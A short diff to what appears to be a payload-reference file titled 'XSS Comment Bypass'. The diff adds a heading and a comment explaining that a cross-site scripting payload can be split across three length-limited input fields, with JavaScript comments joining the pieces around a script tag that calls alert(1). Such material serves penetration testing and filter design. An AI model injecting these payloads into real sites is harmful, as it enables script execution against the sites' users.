@@ -1,5 +1,6 @@
-XSS Comment Bypass
+# XSS Comment Bypass
 
+# If three different fields with character limitation (Can be broken and customized as per scenario)
 "/><script>/*
 */alert(1)/*
 */</script>/*
